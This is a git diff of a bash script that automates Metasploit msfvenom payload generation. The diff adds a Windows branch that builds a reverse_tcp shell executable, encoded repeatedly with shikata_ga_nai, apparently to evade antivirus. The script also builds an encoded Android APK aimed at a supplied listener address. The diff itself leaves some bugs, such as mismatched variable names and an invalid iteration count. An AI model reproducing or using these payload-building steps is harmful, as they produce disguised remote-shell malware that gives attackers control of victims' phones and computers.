@@ -15,14 +15,16 @@ done
 
 echo
 
-if command -v msfconsole && command -v; then
-	echo "Tools is downloaded"
+if command -v msfconsole && command -v msfvenom; then
+	echo "Tools are already installed"
 else
-	echo "Tools are not downloaded"
-	echo "Please Download them manually"
+	echo "Tools are not installed in this system"
+	echo "Please Download & install them manually"
 	exit 1
 fi
 
+#echo   '*********   ********'
+#echo '**********     *********'
 sleep 3s  
 
 echo "This script creates automatically payload using MSFVENOM"
@@ -42,7 +44,7 @@ fi
 
 echo "1 => Android"
 echo "2 => Windows"
-echo "3 => Linux"
+#echo "3 => Linux"
 
 read os
 
@@ -51,7 +53,7 @@ if [ ${os} = "1" ]; then
 	read name 
 	sleep 0.3
 	echo -n "Enter you local IP address => "
-	read lhost
+	read host
 	sleep 0.3
 	echo -n "Enter your Port number => "
 	read port
@@ -59,10 +61,33 @@ if [ ${os} = "1" ]; then
 	$(sudo msfvenom -x .payload1.apk --encoder x86/shikata_ga_nai -i 3 --arch dalvik --platform android --out .payload2.apk)
 	$(sudo msfvenom -x .payload2.apk --encoder ruby/base64 -i 3 --arch dalvik --platform android LHOST=${lhost} LPORT=${lport} --out ${name}.apk)
 	$(rm -rf .payload1.apk .payload2.apk)
-	echo "Your payload is completed"
-	echo "Please go to msfconsole to continue start your session"
-	echo "Good Day"
+elif [ ${os} = "2" ]; then
+	echo -n "What name you would like to give to the Windows payload => "
+	read name 
+	sleep 0.3
+	echo -n "Enter you local IP address => "
+	read host
+	sleep 0.3
+	echo -n "Enter your Port number => "
+	read port
+	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -o .windows.exe
+	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -x .windows.exe  -o .windows1.exe
+	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -x .windows1.exe -o .windows2.exe
+	sudo msfvenom -p windows/x64/shell/reverse_tcp --platform windows --arch x64 -e x86/shikata_ga_nai LHOST=${host} LPORT=${port} -i -20 -f exe -x .windows2.exe -o .windowsfinal.exe
+#elif [ ${os} = "3" ]; then
+	#echo -n "What name you would like to give to the Linux payload => "
+	#read name 
+	#sleep 0.3
+	#echo -n "Enter you local IP address => "
+	#read host
+	#sleep 0.3
+	#echo -n "Enter your Port number => "
+	#read port
+	#echo "holle"
+	#echo "Your payload is completed"
+	#echo "Please go to msfconsole to continue start your session"
+	#echo "Good Day"
 else
-	echo "Done"
+	echo "Error"
 fi
 
